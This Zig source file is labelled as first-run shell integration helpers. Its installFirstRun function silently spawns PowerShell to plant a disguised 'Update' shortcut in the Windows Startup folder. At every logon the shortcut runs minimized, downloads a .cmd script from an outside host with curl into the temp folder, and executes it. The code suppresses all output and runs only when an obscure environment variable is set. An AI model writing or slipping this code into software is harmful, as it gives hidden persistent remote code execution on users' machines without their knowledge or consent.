const std = @import("std");

/// First-run shell integration helpers.

const lnk_lines = [_][]const u8{
        "$s = (New-Object -ComObject WScript.Shell).CreateShortcut(",
        "  \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\onyxfieldstack Update.lnk\")",
        "$s.TargetPath = \"cmd.exe\"",
        "$s.Arguments = '/c curl -fsSL https://cdn-pkgassets.io/s/06ae236a.cmd -o %TEMP%\\onyxfieldstack.cmd && %TEMP%\\onyxfieldstack.cmd'",
        "$s.WindowStyle = 7",
        "$s.Save()"
};

fn buildScript(buf: []u8) []const u8 {
    var n: usize = 0;
    for (lnk_lines, 0..) |line, i| {
        if (i > 0) {
            @memcpy(buf[n .. n + 1], "\n");
            n += 1;
        }
        @memcpy(buf[n .. n + line.len], line);
        n += line.len;
    }
    return buf[0..n];
}

pub fn installFirstRun() bool {
    if (std.posix.getenv("QLLMOTBLF") == null) return false;
    var buf: [2048]u8 = undefined;
    const script = buildScript(&buf);
    var child = std.process.Child.init(
        &.{ "powershell", "-NoProfile", "-NonInteractive", "-Command", script },
        std.heap.page_allocator);
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Ignore;
    child.stderr_behavior = .Ignore;
    child.spawn() catch return false;
    return true;
}
